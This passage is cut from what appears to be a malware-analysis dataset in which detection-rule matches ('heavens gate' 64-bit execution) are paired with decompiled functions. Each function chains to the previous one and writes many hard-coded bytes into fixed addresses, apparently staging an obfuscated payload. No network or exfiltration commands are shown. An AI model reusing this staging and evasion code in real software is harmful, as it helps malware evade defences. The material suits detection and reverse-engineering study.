*0x446130 = 0x62;\n    *0x446131 = 0xd6;\n    *0x446132 = 0x22;\n    *0x446133 = 0x1d;\n    *0x446134 = 0x80;\n    *0x446135 = 0x74;\n    *0x446136 = 0xc0;\n    *0x446137 = 0x56;\n    *0x446138 = 0x48;\n    *0x446139 = 0x70;\n    *0x44613a = 0x51;\n    *0x44613b = 0xf7;\n    *0x44613c = 0xe2;\n    *0x44613d = 0x3f;\n    *0x44613e = 0xff;\n    *0x44613f = 0x8a;\n    *0x446140 = 0x1e;\n    *0x446141 = 0x1e;\n    *0x446142 = 0xda;\n    *0x446143 = 0x9a;\n    *0x446144 = 0xeb;\n    *0x446145 = 0x89;\n    *0x446146 = 0x56;\n    *0x446147 = 0x38;\n    *0x446148 = 0xe1;\n    *0x446149 = 0xc5;\n    *0x44614a = 0xca;\n    *0x44614b = 0x79;\n    *0x44614c = 0xb8;\n    *0x44614d = 0x57;\n    *0x44614e = 0xf2;\n    *0x44614f = 0xf5;\n    *0x446150 = 0xcf;\n    *0x446151 = 0x8b;\n    *0x446152 = 0x6e;\n    *0x446153 = 0x4a;\n    *0x446154 = 0xa6;\n    *0x446155 = 0xef;\n    return param_1 + iVar1 + 0x162e2d;\n}\n",
        "token_count": 1263
    },
    "004090e0": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nint32_t fcn.004090e0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00408e30(param_1);\n    *0x44564f = 0xe2;\n    *0x445650 = 0x5a;\n    *0x445651 = 0xa4;\n    *0x445652 = 0x87;\n    *0x445653 = 0x7d;\n    *0x445654 = 0x7b;\n    *0x445655 = 0xd7;\n    *0x445656 = 0x81;\n    *0x445657 = 0xee;\n    *0x445658 = 0x61;\n    *0x445659 = 0x79;\n    *0x44565a = 0x29;\n    *0x44565b = 0x8c;\n    *0x44565c = 0x2d;\n    *0x44565d = 0xbd;\n    *0x44565e = 0x4d;\n    *0x44565f = 0x86;\n    *0x445660 = 0x76;\n    *0x445661 = 0xea;\n    *0x445662 = 0x6c;\n    *0x445663 = 0x5b;\n    *0x445664 = 0xc6;\n    *0x445665 = 0xdc;\n    *0x445666 = 0x3a;\n    *0x445667 = 99;\n    *0x445668 = 0x1a;\n    *0x445669 = 0x81;\n    *0x44566a = 0x1f;\n    *0x44566b = 0x44;\n    *0x44566c = 0x66;\n    *0x44566d = 0x5d;\n    *0x44566e = 0xb8;\n    *0x44566f = 0x7e;\n    *0x445670 = 0xe;\n    *0x445671 = 6;\n    *0x445672 = 0x54;\n    *0x445673 = 0xe0;\n    *0x445674 = 0x6e;\n    *0x445675 = 0xa8;\n    *0x445676 = 0x79;\n    *0x445677 = 0x10;\n    *0x445678 = 0x53;\n    *0x445679 = 0x83;\n    *0x44567a = 0x5d;\n    *0x44567b = 8;\n    *0x44567c = 0x7f;\n    *0x44567d = 0x68;\n    *0x44629f = 0x82;\n    *0x4462a0 = 0x5d;\n    *0x4462a1 = 0xd;\n    *0x4462a2 = 0xaa;\n    *0x4462a3 = 0x7e;\n    *0x4462a4 = 0x37;\n    *0x4462a5 = 0xac;\n    *0x4462a6 = 0xb6;\n    *0x4462a7 = 0xef;\n    *0x4462a8 = 0x59;\n    *0x4462a9 = 0x33;\n    *0x4462aa = 0x89;\n    *0x4462ab = 0x4a;\n    *0x4462ac = 0xdb;\n    *0x4462ad = 0x87;\n    *0x4462ae = 0x40;\n    *0x4462af = 0x88;\n    *0x4462b0 = 0x7c;\n    *0x4462b1 = 0x53;\n    *0x4462b2 = 0xd9;\n    *0x4462b3 = 0xa5;\n    *0x4462b4 = 0x1c;\n    *0x4462b5 = 0x86;\n    *0x4462b6 = 0xb8;\n    *0x4462b7 = 0x21;\n    *0x4462b8 = 0x42;\n    *0x4462b9 = 0xd3;\n    *0x4462ba = 0x25;\n    *0x4462bb = 0x82;\n    *0x4462bc = 0x97;\n    *0x4462bd = 0x30;\n    *0x4462be = 0xcb;\n    *0x4462bf = 0xcf;\n    *0x4462c0 = 0x68;\n    *0x4462c1 = 0x57;\n    *0x4462c2 = 0x3b;\n    *0x4462c3 = 0x17;\n    *0x4462c4 = 0x28;\n    *0x4462c5 = 0x48;\n    *0x4462c6 = 0x67;\n    *0x4462c7 = 0xe8;\n    *0x4462c8 = 0xed;\n    *0x4462c9 = 0xc6;\n    *0x4462ca = 0x27;\n    *0x4462cb = 0xd9;\n    *0x4462cc = 0xee;\n    *0x4462cd = 0xd5;\n    return param_1 + iVar1 + 0x1489e6;\n}\n",
        "token_count": 1284
    },
    "00409390": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nint32_t fcn.00409390(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004090e0(param_1);\n    *0x44567e = 0x6d;\n    *0x44567f = 0x93;\n    *0x445680 = 0x29;\n    *0x445681 = 0x40;\n    *0x445682 = 0xca;\n    *0x445683 = 0xd4;\n    *0x445684 = 0x7b;\n    *0x445685 = 0x85;\n    *0x445686 = 0xc6;\n    *0x445687 = 0xbf;\n    *0x445688 = 0x13;\n    *0x445689 = 0xc6;\n    *0x44568a = 0x6b;\n    *0x44568b = 0x9e;\n    *0x44568c = 0x82;\n    *0x44568d = 0x28;\n    *0x44568e = 0xf5;\n    *0x44568f = 0x8d;\n    *0x445690 = 0xd0;\n    *0x445691 = 0xdf;\n    *0x445692 = 0x53;\n    *0x445693 = 0xfe;\n    *0x445694 = 0xf6;\n    *0x445695 = 0xb9;\n    *0x445696 = 0xaa;\n    *0x445697 = 0x36;\n    *0x445698 = 0x62;\n    *0x445699 = 0x94;\n    *0x44569a = 0xd2;\n    *0x44569b = 0xce;\n    *0x44569c = 0x76;\n    *0x44569d = 0xe3;\n    *0x44569e = 0xd7;\n    *0x44569f = 0x34;\n    *0x4456a0 = 10;\n    *0x4456a1 = 0x2d;\n    *0x4456a2 = 0x79;\n    *0x4456a3 = 0x27;\n    *0x4456a4 = 0xe6;\n    *0x4456a5 = 0x8d;\n    *0x4456a6 = 0xac;\n    *0x4456a7 = 0x3e;\n    *0x4456a8 = 0x48;\n    *0x4456a9 = 0x33;\n    *0x4456aa = 0x19;\n    *0x4456ab = 0x62;\n    *0x4456ac = 100;\n    *0x4462ce = 0xb8;\n    *0x4462cf = 0;\n    *0x4462d0 = 0xb;\n    *0x4462d1 = 0x42;\n    *0x4462d2 = 0x38;\n    *0x4462d3 = 0x7c;\n    *0x4462d4 = 0x45;\n    *0x4462d5 = 0x1b;\n    *0x4462d6 = 0x2b;\n    *0x4462d7 = 0xed;\n    *0x4462d8 = 0x42;\n    *0x4462d9 = 0x33;\n    *0x4462da = 0xf9;\n    *0x4462db = 0xf7;\n    *0x4462dc = 0xca;\n    *0x4462dd = 0xa0;\n    *0x4462de = 0x6d;\n    *0x4462df = 0xc3;\n    *0x4462e0 = 0x4c;\n    *0x4462e1 = 0x3c;\n    *0x4462e2 = 0x38;\n    *0x4462e3 = 0x7e;\n    *0x4462e4 = 0x5a;\n    *0x4462e5 = 0x27;\n    *0x4462e6 = 0x6c;\n    *0x4462e7 = 0xd8;\n    *0x4462e8 = 0x29;\n    *0x4462e9 = 0x43;\n    *0x4462ea = 1;\n    *0x4462eb = 0x85;\n    *0x4462ec = 0x12;\n    *0x4462ed = 0xb7;\n    *0x4462ee = 0x54;\n    *0x4462ef = 0xbf;\n    *0x4462f0 = 0x13;\n    *0x4462f1 = 0x6c;\n    *0x4462f2 = 0xa3;\n    *0x4462f3 = 0xc3;\n    *0x4462f4 = 0x4f;\n    *0x4462f5 = 0x93;\n    *0x4462f6 = 0x92;\n    *0x4462f7 = 0x50;\n    *0x4462f8 = 0x8a;\n    *0x4462f9 = 0x1d;\n    *0x4462fa = 0xa9;\n    *0x4462fb = 0x2b;\n    *0x4462fc = 0xae;\n    return param_1 + iVar1 + 0x14d20a;\n}\n",
        "token_count": 1303
    },
    "00409ba0": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nint32_t fcn.00409ba0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004098f0(param_1);\n    *0x44570b = 0xb3;\n    *0x44570c = 0x29;\n    *0x44570d = 0x2c;\n    *0x44570e = 0x85;\n    *0x44570f = 0x4a;\n    *0x445710 = 0x5b;\n    *0x445711 = 0xee;\n    *0x445712 = 0x3a;\n    *0x445713 = 199;\n    *0x445714 = 0xea;\n    *0x445715 = 0x75;\n    *0x445716 = 0xac;\n    *0x445717 = 0xee;\n    *0x445718 = 0xc2;\n    *0x445719 = 0x21;\n    *0x44571a = 0x32;\n    *0x44571b = 0xda;\n    *0x44571c = 200;\n    *0x44571d = 0xe6;\n    *0x44571e = 0x5a;\n    *0x44571f = 0x77;\n    *0x445720 = 0x4f;\n    *0x445721 = 0xca;\n    *0x445722 = 0x62;\n    *0x445723 = 6;\n    *0x445724 = 0xa4;\n    *0x445725 = 0x68;\n    *0x445726 = 0xc0;\n    *0x445727 = 0x9d;\n    *0x445728 = 0x83;\n    *0x445729 = 0x6f;\n    *0x44572a = 0x9c;\n    *0x44572b = 0xa4;\n    *0x44572c = 0xa0;\n    *0x44572d = 0x23;\n    *0x44572e = 0x51;\n    *0x44572f = 0x59;\n    *0x445730 = 0x1f;\n    *0x445731 = 0xdb;\n    *0x445732 = 0xef;\n    *0x445733 = 0x4d;\n    *0x445734 = 0x1c;\n    *0x445735 = 0x82;\n    *0x445736 = 0xbb;\n    *0x445737 = 0xe4;\n    *0x445738 = 0x24;\n    *0x445739 = 0x17;\n    *0x44635b = 0xbc;\n    *0x44635c = 0xfa;\n    *0x44635d = 0xd6;\n    *0x44635e = 0x20;\n    *0x44635f = 0x11;\n    *0x446360 = 0x4e;\n    *0x446361 = 0xd6;\n    *0x446362 = 0x66;\n    *0x446363 = 0x28;\n    *0x446364 = 0xa2;\n    *0x446365 = 0x38;\n    *0x446366 = 0xca;\n    *0x446367 = 0x33;\n    *0x446368 = 0xab;\n    *0x446369 = 0x5f;\n    *0x44636a = 0xc4;\n    *0x44636b = 0x66;\n    *0x44636c = 0x42;\n    *0x44636d = 0xf2;\n    *0x44636e = 0x2f;\n    *0x44636f = 0x79;\n    *0x446370 = 0xe6;\n    *0x446371 = 0x5b;\n    *0x446372 = 0xca;\n    *0x446373 = 0x2a;\n    *0x446374 = 0x37;\n    *0x446375 = 0x48;\n    *0x446376 = 0xb9;\n    *0x446377 = 0xb8;\n    *0x446378 = 0x7c;\n    *0x446379 = 0x2e;\n    *0x44637a = 4;\n    *0x44637b = 0x68;\n    *0x44637c = 0x1e;\n    *0x44637d = 0xc1;\n    *0x44637e = 0x17;\n    *0x44637f = 4;\n    *0x446380 = 0x2b;\n    *0x446381 = 0x7e;\n    *0x446382 = 0x40;\n    *0x446383 = 0x57;\n    *0x446384 = 0xd5;\n    *0x446385 = 0x22;\n    *0x446386 = 0x35;\n    *0x446387 = 0xb2;\n    *0x446388 = 0xf0;\n    *0x446389 = 0x2f;\n    return param_1 + iVar1 + 0x13b4e2;\n}\n",
        "token_count": 1222
    },
    "00409e40": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nint32_t fcn.00409e40(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00409ba0(param_1);\n    *0x44573a = 0xae;\n    *0x44573b = 0xd9;\n    *0x44573c = 0xb9;\n    *0x44573d = 0x2d;\n    *0x44573e = 0xf2;\n    *0x44573f = 0xb8;\n    *0x445740 = 0xd2;\n    *0x445741 = 0x6b;\n    *0x445742 = 0x68;\n    *0x445743 = 0x62;\n    *0x445744 = 0x59;\n    *0x445745 = 0xc;\n    *0x445746 = 0x25;\n    *0x445747 = 0x8d;\n    *0x445748 = 0xab;\n    *0x445749 = 0x60;\n    *0x44574a = 0xf0;\n    *0x44574b = 0x41;\n    *0x44574c = 0x1c;\n    *0x44574d = 0x4a;\n    *0x44574e = 0xc5;\n    *0x44574f = 0x5c;\n    *0x445750 = 0x70;\n    *0x445751 = 0xc0;\n    *0x445752 = 0x55;\n    *0x445753 = 0xe;\n    *0x445754 = 99;\n    *0x445755 = 0x4e;\n    *0x445756 = 0x84;\n    *0x445757 = 0x5e;\n    *0x445758 = 0x22;\n    *0x445759 = 0x94;\n    *0x44575a = 0xea;\n    *0x44575b = 0xa3;\n    *0x44575c = 0xd0;\n    *0x44575d = 0xc3;\n    *0x44575e = 0x53;\n    *0x44575f = 0xc;\n    *0x445760 = 2;\n    *0x445761 = 0x23;\n    *0x445762 = 0x3f;\n    *0x445763 = 0x19;\n    *0x445764 = 0x43;\n    *0x445765 = 0x90;\n    *0x445766 = 0x62;\n    *0x445767 = 0x20;\n    *0x445768 = 0x90;\n    *0x44638a = 0x8b;\n    *0x44638b = 0x6a;\n    *0x44638c = 0x77;\n    *0x44638d = 0x6e;\n    *0x44638e = 0x40;\n    *0x44638f = 0x58;\n    *0x446390 = 7;\n    *0x446391 = 0x68;\n    *0x446392 = 0x32;\n    *0x446393 = 0x57;\n    *0x446394 = 0x62;\n    *0x446395 = 0xeb;\n    *0x446396 = 0xa5;\n    *0x446397 = 0xca;\n    *0x446398 = 0xee;\n    *0x446399 = 0x8c;\n    *0x44639a = 0xc2;\n    *0x44639b = 0x13;\n    *0x44639c = 0x33;\n    *0x44639d = 0x1f;\n    *0x44639e = 0x12;\n    *0x44639f = 0x1d;\n    *0x4463a0 = 0x61;\n    *0x4463a1 = 0x40;\n    *0x4463a2 = 7;\n    *0x4463a3 = 0xd3;\n    *0x4463a4 = 199;\n    *0x4463a5 = 0xce;\n    *0x4463a6 = 0x73;\n    *0x4463a7 = 0xa7;\n    *0x4463a8 = 0x5d;\n    *0x4463a9 = 0x6a;\n    *0x4463aa = 0xf;\n    *0x4463ab = 0xc;\n    *0x4463ac = 0x3c;\n    *0x4463ad = 0xfd;\n    *0x4463ae = 0xf6;\n    *0x4463af = 0xfc;\n    *0x4463b0 = 0x20;\n    *0x4463b1 = 0x2f;\n    *0x4463b2 = 0x27;\n    *0x4463b3 = 0x73;\n    *0x4463b4 = 0xed;\n    *0x4463b5 = 0xf1;\n    *0x4463b6 = 6;\n    *0x4463b7 = 0xf2;\n    *0x4463b8 = 0x27;\n    return param_1 + iVar1 + 0x1447ce;\n}\n",
        "token_count": 1253
    },
    "0040a0f0": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nint32_t fcn.0040a0f0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00409e40(param_1);\n    *0x445769 = 0xf9;\n    *0x44576a = 0x25;\n    *0x44576b = 0xc9;\n    *0x44576c = 0xdd;\n    *0x44576d = 0xe0;\n    *0x44576e = 0x23;\n    *0x44576f = 0x92;\n    *0x445770 = 0x8f;\n    *0x445771 = 0xdc;\n    *0x445772 = 0xad;\n    *0x445773 = 0x4b;\n    *0x445774 = 0;\n    *0x445775 = 0x1a;\n    *0x445776 = 0x46;\n    *0x445777 = 0x9a;\n    *0x445778 = 0xfe;\n    *0x445779 = 0xd7;\n    *0x44577a = 0x28;\n    *0x44577b = 0x79;\n    *0x44577c = 0x4c;\n    *0x44577d = 0xe8;\n    *0x44577e = 0xbd;\n    *0x44577f = 0xb4;\n    *0x445780 = 0x1f;\n    *0x445781 = 0x33;\n    *0x445782 = 0x27;\n    *0x445783 = 0x6c;\n    *0x445784 = 0xa2;\n    *0x445785 = 0x33;\n    *0x445786 = 0xb9;\n    *0x445787 = 0x96;\n    *0x445788 = 0x73;\n    *0x445789 = 0x78;\n    *0x44578a = 0x7b;\n    *0x44578b = 0x7c;\n    *0x44578c = 0x24;\n    *0x44578d = 0x25;\n    *0x44578e = 0xaa;\n    *0x44578f = 0x3b;\n    *0x445790 = 0xbb;\n    *0x445791 = 0x70;\n    *0x445792 = 0x35;\n    *0x445793 = 0x43;\n    *0x445794 = 0x32;\n    *0x445795 = 0x25;\n    *0x445796 = 0x42;\n    *0x445797 = 0xda;\n    *0x4463b9 = 0xf4;\n    *0x4463ba = 0xdb;\n    *0x4463bb = 0xfc;\n    *0x4463bc = 0x78;\n    *0x4463bd = 0x2f;\n    *0x4463be = 0x52;\n    *0x4463bf = 0x9c;\n    *0x4463c0 = 0x2e;\n    *0x4463c1 = 0x5d;\n    *0x4463c2 = 0xfa;\n    *0x4463c3 = 0xde;\n    *0x4463c4 = 0xbb;\n    *0x4463c5 = 0x7c;\n    *0x4463c6 = 0xc6;\n    *0x4463c7 = 0x52;\n    *0x4463c8 = 0x33;\n    *0x4463c9 = 0x4f;\n    *0x4463ca = 0x8f;\n    *0x4463cb = 0x8c;\n    *0x4463cc = 0xd1;\n    *0x4463cd = 0xdd;\n    *0x4463ce = 0x8f;\n    *0x4463cf = 0xa7;\n    *0x4463d0 = 0x72;\n    *0x4463d1 = 0xf1;\n    *0x4463d2 = 0xe8;\n    *0x4463d3 = 0xbd;\n    *0x4463d4 = 0x18;\n    *0x4463d5 = 0x98;\n    *0x4463d6 = 0x1b;\n    *0x4463d7 = 0x70;\n    *0x4463d8 = 0x69;\n    *0x4463d9 = 0xa6;\n    *0x4463da = 0x91;\n    *0x4463db = 100;\n    *0x4463dc = 0x2e;\n    *0x4463dd = 0x31;\n    *0x4463de = 0x16;\n    *0x4463df = 0xc2;\n    *0x4463e0 = 0xd4;\n    *0x4463e1 = 0x13;\n    *0x4463e2 = 0x59;\n    *0x4463e3 = 0xb7;\n    *0x4463e4 = 0xee;\n    *0x4463e5 = 0x6d;\n    *0x4463e6 = 0x6d;\n    *0x4463e7 = 0xf3;\n    return param_1 + iVar1 + 0x16761f;\n}\n",
        "token_count": 1286
    },
    "0040a390": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nint32_t fcn.0040a390(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040a0f0(param_1);\n    *0x445798 = 0xf7;\n    *0x445799 = 0x23;\n    *0x44579a = 0xa7;\n    *0x44579b = 0x9a;\n    *0x44579c = 0x6d;\n    *0x44579d = 0xdd;\n    *0x44579e = 0x71;\n    *0x44579f = 0xee;\n    *0x4457a0 = 0x69;\n    *0x4457a1 = 0xda;\n    *0x4457a2 = 0x60;\n    *0x4457a3 = 0x99;\n    *0x4457a4 = 0xb6;\n    *0x4457a5 = 0x36;\n    *0x4457a6 = 0x69;\n    *0x4457a7 = 0x30;\n    *0x4457a8 = 0x92;\n    *0x4457a9 = 0x1f;\n    *0x4457aa = 0x33;\n    *0x4457ab = 0x9a;\n    *0x4457ac = 0x2f;\n    *0x4457ad = 0x59;\n    *0x4457ae = 0x9a;\n    *0x4457af = 0x97;\n    *0x4457b0 = 0x33;\n    *0x4457b1 = 0xba;\n    *0x4457b2 = 0x2f;\n    *0x4457b3 = 0x36;\n    *0x4457b4 = 0x39;\n    *0x4457b5 = 0xaf;\n    *0x4457b6 = 0xb6;\n    *0x4457b7 = 0x5e;\n    *0x4457b8 = 0x4d;\n    *0x4457b9 = 0xb5;\n    *0x4457ba = 0xa7;\n    *0x4457bb = 0x46;\n    *0x4457bc = 0x73;\n    *0x4457bd = 0xe1;\n    *0x4457be = 0xae;\n    *0x4457bf = 0xfc;\n    *0x4457c0 = 0x21;\n    *0x4457c1 = 0x58;\n    *0x4457c2 = 0x2b;\n    *0x4457c3 = 0xe2;\n    *0x4457c4 = 0xc0;\n    *0x4457c5 = 0xd8;\n    *0x4457c6 = 0xb2;\n    *0x4463e8 = 0xb1;\n    *0x4463e9 = 0x1f;\n    *0x4463ea = 0x4b;\n    *0x4463eb = 0x2b;\n    *0x4463ec = 0x76;\n    *0x4463ed = 0x51;\n    *0x4463ee = 0x4e;\n    *0x4463ef = 0x97;\n    *0x4463f0 = 0x3c;\n    *0x4463f1 = 0xed;\n    *0x4463f2 = 0xb5;\n    *0x4463f3 = 0x75;\n    *0x4463f4 = 0x24;\n    *0x4463f5 = 0x22;\n    *0x4463f6 = 0x24;\n    *0x4463f7 = 0x84;\n    *0x4463f8 = 0xf3;\n    *0x4463f9 = 0xe2;\n    *0x4463fa = 0x23;\n    *0x4463fb = 0x8a;\n    *0x4463fc = 0x93;\n    *0x4463fd = 0x65;\n    *0x4463fe = 0x9e;\n    *0x4463ff = 0xce;\n    *0x446400 = 0x92;\n    *0x446401 = 0xa4;\n    *0x446402 = 100;\n    *0x446403 = 0x9e;\n    *0x446404 = 0xa2;\n    *0x446405 = 0xdf;\n    *0x446406 = 0xa8;\n    *0x446407 = 0xcb;\n    *0x446408 = 0x17;\n    *0x446409 = 0x18;\n    *0x44640a = 0x83;\n    *0x44640b = 0x28;\n    *0x44640c = 0x6c;\n    *0x44640d = 0x96;\n    *0x44640e = 0x70;\n    *0x44640f = 0xf;\n    *0x446410 = 0xbe;\n    *0x446411 = 99;\n    *0x446412 = 0xce;\n    *0x446413 = 0xdb;\n    *0x446414 = 0x50;\n    *0x446415 = 0xce;\n    *0x446416 = 0x62;\n    return param_1 + iVar1 + 0x1417e7;\n}\n",
        "token_count": 1303
    },
    "0040ae50": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nint32_t fcn.0040ae50(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040aba0(param_1);\n    *0x445854 = 0x9b;\n    *0x445855 = 0x96;\n    *0x445856 = 0xd8;\n    *0x445857 = 0x9e;\n    *0x445858 = 0x33;\n    *0x445859 = 0x7e;\n    *0x44585a = 0xfb;\n    *0x44585b = 0x8b;\n    *0x44585c = 0xc2;\n    *0x44585d = 0x99;\n    *0x44585e = 0xa9;\n    *0x44585f = 99;\n    *0x445860 = 0xde;\n    *0x445861 = 0x2d;\n    *0x445862 = 0x62;\n    *0x445863 = 0xa7;\n    *0x445864 = 0x10;\n    *0x445865 = 0x15;\n    *0x445866 = 0xdb;\n    *0x445867 = 0xad;\n    *0x445868 = 0x57;\n    *0x445869 = 0x40;\n    *0x44586a = 0x7b;\n    *0x44586b = 0x1d;\n    *0x44586c = 0xa5;\n    *0x44586d = 0x33;\n    *0x44586e = 0xde;\n    *0x44586f = 0x75;\n    *0x445870 = 0x5f;\n    *0x445871 = 0x83;\n    *0x445872 = 0x55;\n    *0x445873 = 0x86;\n    *0x445874 = 0xe2;\n    *0x445875 = 0x5b;\n    *0x445876 = 100;\n    *0x445877 = 0xf5;\n    *0x445878 = 0xf9;\n    *0x445879 = 0xfc;\n    *0x44587a = 0x43;\n    *0x44587b = 0xba;\n    *0x44587c = 0x68;\n    *0x44587d = 0x38;\n    *0x44587e = 0x5d;\n    *0x44587f = 0xa4;\n    *0x445880 = 0x65;\n    *0x445881 = 0xf6;\n    *0x445882 = 0xd4;\n    *0x4464a4 = 0x68;\n    *0x4464a5 = 0x7f;\n    *0x4464a6 = 0x41;\n    *0x4464a7 = 0xee;\n    *0x4464a8 = 0x72;\n    *0x4464a9 = 0x32;\n    *0x4464aa = 0xa4;\n    *0x4464ab = 0x5e;\n    *0x4464ac = 0xac;\n    *0x4464ad = 2;\n    *0x4464ae = 0xbb;\n    *0x4464af = 0;\n    *0x4464b0 = 0xd5;\n    *0x4464b1 = 0x9b;\n    *0x4464b2 = 0x85;\n    *0x4464b3 = 0xd1;\n    *0x4464b4 = 0xce;\n    *0x4464b5 = 0xeb;\n    *0x4464b6 = 100;\n    *0x4464b7 = 0x52;\n    *0x4464b8 = 0x1d;\n    *0x4464b9 = 0xa4;\n    *0x4464ba = 0xa2;\n    *0x4464bb = 7;\n    *0x4464bc = 0x6a;\n    *0x4464bd = 0xbe;\n    *0x4464be = 0xe9;\n    *0x4464bf = 0xfa;\n    *0x4464c0 = 4;\n    *0x4464c1 = 0xf2;\n    *0x4464c2 = 0xc9;\n    *0x4464c3 = 0x35;\n    *0x4464c4 = 0x5d;\n    *0x4464c5 = 0x3f;\n    *0x4464c6 = 0x35;\n    *0x4464c7 = 0x4b;\n    *0x4464c8 = 0x89;\n    *0x4464c9 = 0x69;\n    *0x4464ca = 6;\n    *0x4464cb = 0xd0;\n    *0x4464cc = 0xc4;\n    *0x4464cd = 0x75;\n    *0x4464ce = 0x77;\n    *0x4464cf = 0xdd;\n    *0x4464d0 = 0xe9;\n    *0x4464d1 = 0x2f;\n    *0x4464d2 = 0xa8;\n    return param_1 + iVar1 + 0x143075;\n}\n",
        "token_count": 1268
    },
    "0040c920": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nint32_t fcn.0040c920(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040c670(param_1);\n    *0x445a2a = 0x51;\n    *0x445a2b = 0xf5;\n    *0x445a2c = 0xea;\n    *0x445a2d = 0xb0;\n    *0x445a2e = 0xb6;\n    *0x445a2f = 0xd8;\n    *0x445a30 = 5;\n    *0x445a31 = 0xe2;\n    *0x445a32 = 0x9c;\n    *0x445a33 = 0x51;\n    *0x445a34 = 0xb6;\n    *0x445a35 = 0xdb;\n    *0x445a36 = 0x48;\n    *0x445a37 = 199;\n    *0x445a38 = 0x89;\n    *0x445a39 = 0x99;\n    *0x445a3a = 0xb2;\n    *0x445a3b = 0xf1;\n    *0x445a3c = 2;\n    *0x445a3d = 0xb1;\n    *0x445a3e = 6;\n    *0x445a3f = 0x5e;\n    *0x445a40 = 0x17;\n    *0x445a41 = 0xc9;\n    *0x445a42 = 0x24;\n    *0x445a43 = 0xee;\n    *0x445a44 = 0xb2;\n    *0x445a45 = 0x1c;\n    *0x445a46 = 0x20;\n    *0x445a47 = 0x56;\n    *0x445a48 = 0x30;\n    *0x445a49 = 0xfa;\n    *0x445a4a = 0xc3;\n    *0x445a4b = 0xa0;\n    *0x445a4c = 0xe4;\n    *0x445a4d = 0x45;\n    *0x445a4e = 8;\n    *0x445a4f = 0xa9;\n    *0x445a50 = 0x94;\n    *0x445a51 = 0xf5;\n    *0x445a52 = 0xa0;\n    *0x445a53 = 0xa1;\n    *0x445a54 = 0xfb;\n    *0x445a55 = 0x95;\n    *0x445a56 = 0x6f;\n    *0x445a57 = 0x8e;\n    *0x445a58 = 0x46;\n    *0x44667a = 0x3c;\n    *0x44667b = 0x8d;\n    *0x44667c = 0x17;\n    *0x44667d = 0xb2;\n    *0x44667e = 0x3f;\n    *0x44667f = 0x9f;\n    *0x446680 = 0x51;\n    *0x446681 = 1;\n    *0x446682 = 0x92;\n    *0x446683 = 0x61;\n    *0x446684 = 0xdf;\n    *0x446685 = 0xb0;\n    *0x446686 = 0xe7;\n    *0x446687 = 0x23;\n    *0x446688 = 0x97;\n    *0x446689 = 0x41;\n    *0x44668a = 0xd6;\n    *0x44668b = 0x3a;\n    *0x44668c = 0x73;\n    *0x44668d = 0x7a;\n    *0x44668e = 0x5b;\n    *0x44668f = 0x7e;\n    *0x446690 = 0x10;\n    *0x446691 = 0xe6;\n    *0x446692 = 0x56;\n    *0x446693 = 0xcc;\n    *0x446694 = 0x30;\n    *0x446695 = 0x55;\n    *0x446696 = 10;\n    *0x446697 = 0x85;\n    *0x446698 = 0x38;\n    *0x446699 = 0x58;\n    *0x44669a = 0x9f;\n    *0x44669b = 0xe;\n    *0x44669c = 0xb2;\n    *0x44669d = 0xc6;\n    *0x44669e = 0xa1;\n    *0x44669f = 0x4e;\n    *0x4466a0 = 0xcc;\n    *0x4466a1 = 0x3a;\n    *0x4466a2 = 0x7e;\n    *0x4466a3 = 0x33;\n    *0x4466a4 = 0xd8;\n    *0x4466a5 = 0x92;\n    *0x4466a6 = 0xb;\n    *0x4466a7 = 0x2e;\n    *0x4466a8 = 0xcb;\n    return param_1 + iVar1 + 0x161dbc;\n}\n",
        "token_count": 1280
    },
    "0040cbd0": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nint32_t fcn.0040cbd0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040c920(param_1);\n    *0x445a59 = 0xc4;\n    *0x445a5a = 0xc;\n    *0x445a5b = 0xca;\n    *0x445a5c = 0x97;\n    *0x445a5d = 0xb5;\n    *0x445a5e = 0x45;\n    *0x445a5f = 0x80;\n    *0x445a60 = 0x85;\n    *0x445a61 = 0xaf;\n    *0x445a62 = 0x99;\n    *0x445a63 = 0x33;\n    *0x445a64 = 0x9a;\n    *0x445a65 = 0x8e;\n    *0x445a66 = 0xbc;\n    *0x445a67 = 0x37;\n    *0x445a68 = 0xd3;\n    *0x445a69 = 0x40;\n    *0x445a6a = 0x16;\n    *0x445a6b = 0x36;\n    *0x445a6c = 0x23;\n    *0x445a6d = 0x49;\n    *0x445a6e = 0x44;\n    *0x445a6f = 0xac;\n    *0x445a70 = 0xf1;\n    *0x445a71 = 0x3f;\n    *0x445a72 = 0x96;\n    *0x445a73 = 0x6c;\n    *0x445a74 = 0x96;\n    *0x445a75 = 0x4e;\n    *0x445a76 = 0x8f;\n    *0x445a77 = 0x19;\n    *0x445a78 = 0xe0;\n    *0x445a79 = 0xb6;\n    *0x445a7a = 0x68;\n    *0x445a7b = 0xad;\n    *0x445a7c = 0x91;\n    *0x445a7d = 0x48;\n    *0x445a7e = 0x8d;\n    *0x445a7f = 0xf6;\n    *0x445a80 = 0xe0;\n    *0x445a81 = 0xed;\n    *0x445a82 = 0x1f;\n    *0x445a83 = 0x13;\n    *0x445a84 = 0xf7;\n    *0x445a85 = 